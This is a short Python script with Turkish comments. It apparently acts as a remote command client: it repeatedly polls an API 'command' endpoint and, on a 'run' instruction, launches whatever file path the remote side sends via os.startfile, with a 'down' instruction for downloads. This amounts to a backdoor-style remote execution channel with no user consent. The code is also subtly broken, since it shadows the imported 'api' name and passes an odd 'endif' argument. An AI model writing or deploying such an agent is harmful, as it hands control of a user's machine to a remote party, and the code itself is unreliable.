from src.api import *
import os



def dedec(apiuri):
    api = api(uri=apiuri)
    izin_verilen_komutlar = ["run", "down"]  # Geçerli komutlar listesi

    while True:
        res1 = api.get(endif="command")
        while True:
            res2 = api.get(endif="command")
            if res2 != res1:
                res1 = res2
                parçalar = res2.split(" ")
                print(f"Gelen veri parçaları: {parçalar}")

                # Gelen verinin yeterli parçaya sahip olup olmadığını kontrol et
                if len(parçalar) < 2:
                    print("Geçersiz komut formatı, en az 2 parça bekleniyor.")
                    continue

                komut = parçalar[0]
                dosya_yolu = parçalar[1]

                # Komutun geçerli olup olmadığını kontrol et
                if komut not in izin_verilen_komutlar:
                    print(f"Bilinmeyen veya desteklenmeyen komut: {komut}")
                    continue

                if komut == "run":
                    try:
                        os.startfile(dosya_yolu)
                        print(f"Dosya başarıyla çalıştırıldı: {dosya_yolu}")
                    except FileNotFoundError:
                        print(f"Dosya bulunamadı: {dosya_yolu}")
                    except Exception as e:
                        print(f"Dosya çalıştırılırken hata oluştu: {dosya_yolu}. Hata: {e}")
                elif komut == "down":
                    # Üçüncü öğe varsa işle, yoksa sadece dosya yolunu işaretle
                    indirilecek_dosya = parçalar[2] if len(parçalar) > 2 else dosya_yolu
                    print(f"Dosya indiriliyor: {indirilecek_dosya}")
                    return f"down {indirilecek_dosya}"

